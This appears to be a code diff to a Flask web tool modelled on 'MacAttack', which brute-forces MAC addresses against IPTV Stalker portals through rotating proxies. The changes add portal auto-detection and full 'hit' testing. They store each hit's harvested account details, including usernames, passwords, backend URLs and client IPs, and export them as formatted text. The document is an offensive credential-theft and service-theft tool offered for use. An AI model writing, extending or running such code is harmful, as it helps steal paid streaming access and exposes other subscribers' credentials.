@@ -357,6 +357,12 @@ def api_attack_start():
         if not url.startswith("http"):
             url = f"http://{url}"
         
+        # Auto-detect portal endpoint if user only provided base URL
+        detected_url, portal_type, version = stb.auto_detect_portal_url(url)
+        if detected_url:
+            url = detected_url
+            logger.info(f"Auto-detected portal: {url} (type: {portal_type}, version: {version})")
+        
         portal_id = secrets.token_hex(4)
         
         with attack_states_lock:
@@ -536,7 +542,7 @@ def run_attack(portal_id):
             for future in done_futures:
                 mac, proxy = futures.pop(future)
                 try:
-                    success, expiry, message = future.result()
+                    success, result = future.result()
                     state["tested"] += 1
                     state["current_mac"] = mac
                     
@@ -544,24 +550,45 @@ def run_attack(portal_id):
                     
                     if success:
                         state["hits"] += 1
+                        
+                        # Build display info like original MacAttack
+                        expiry = result.get("expiry", "Unknown")
+                        channels = result.get("channels", 0)
+                        genres = result.get("genres", [])
+                        
                         state["found_macs"].append({
                             "mac": mac,
                             "expiry": expiry,
+                            "channels": channels,
                             "time": datetime.now().strftime("%H:%M:%S")
                         })
-                        add_log(state, f"HIT! {mac} - Expiry: {expiry}{proxy_info}", "success")
                         
+                        # Log with channels count like original
+                        add_log(state, f"HIT! {mac} - Expiry: {expiry} - Channels: {channels}{proxy_info}", "success")
+                        
+                        # Save full result to config (persistent storage)
                         config["found_macs"].append({
                             "mac": mac,
                             "expiry": expiry,
                             "portal": portal_url,
+                            "channels": channels,
+                            "genres": genres,
+                            "vod_categories": result.get("vod_categories", []),
+                            "series_categories": result.get("series_categories", []),
+                            "backend_url": result.get("backend_url"),
+                            "username": result.get("username"),
+                            "password": result.get("password"),
+                            "max_connections": result.get("max_connections"),
+                            "created_at": result.get("created_at"),
+                            "client_ip": result.get("client_ip"),
                             "found_at": datetime.now().isoformat()
                         })
                         if settings.get("auto_save", True):
                             save_config()
                     else:
                         # Track proxy errors
-                        if "timeout" in message.lower() or "connection" in message.lower():
+                        message = result.get("expiry", "") or ""
+                        if isinstance(message, str) and ("timeout" in message.lower() or "connection" in message.lower()):
                             mark_proxy_error(proxy, is_connection_error=True)
                         
                         if state["tested"] % 100 == 0:
@@ -579,7 +606,8 @@ def run_attack(portal_id):
 
 
 def test_mac_worker(portal_url, mac, proxy, timeout):
-    return stb.test_mac(portal_url, mac, proxy, timeout)
+    """Use full MAC test like original MacAttack."""
+    return stb.test_mac_full(portal_url, mac, proxy, timeout)
 
 
 # ============== PROXY ROUTES WITH CUSTOM SOURCES ==============
@@ -863,6 +891,7 @@ def api_found():
 
 @app.route("/api/found/export")
 def api_found_export():
+    """Export found MACs - like original MacAttack output format."""
     format_type = request.args.get("format", "txt")
     found = config.get("found_macs", [])
     
@@ -873,7 +902,36 @@ def api_found_export():
             headers={"Content-Disposition": "attachment;filename=found_macs.json"}
         )
     else:
-        lines = [f"{m['mac']} | {m.get('expiry', 'N/A')} | {m.get('portal', 'N/A')}" for m in found]
+        # Format like original MacAttack
+        lines = []
+        for m in found:
+            line = f"{'Portal:':<10} {m.get('portal', 'N/A')}\n"
+            line += f"{'MAC:':<10} {m['mac']}\n"
+            
+            if m.get('username') and m.get('password'):
+                line += f"{'Username:':<10} {m.get('username')}\n"
+                line += f"{'Password:':<10} {m.get('password')}\n"
+            
+            if m.get('max_connections'):
+                line += f"{'Max Conn:':<10} {m.get('max_connections')}\n"
+            
+            line += f"{'Found on:':<10} {m.get('found_at', 'N/A')}\n"
+            
+            if m.get('created_at'):
+                line += f"{'Creation:':<10} {m.get('created_at')}\n"
+            
+            line += f"{'Exp date:':<10} {m.get('expiry', 'N/A')}\n"
+            line += f"{'Channels:':<10} {m.get('channels', 0)}\n"
+            
+            if m.get('genres'):
+                line += f"{'Playlist:':<10} {', '.join(m.get('genres', []))}\n"
+            
+            if m.get('vod_categories'):
+                line += f"{'VOD list:':<10} {', '.join(m.get('vod_categories', []))}\n"
+            
+            line += "\n" + "="*50 + "\n"
+            lines.append(line)
+        
         return Response(
             "\n".join(lines),
             mimetype="text/plain",
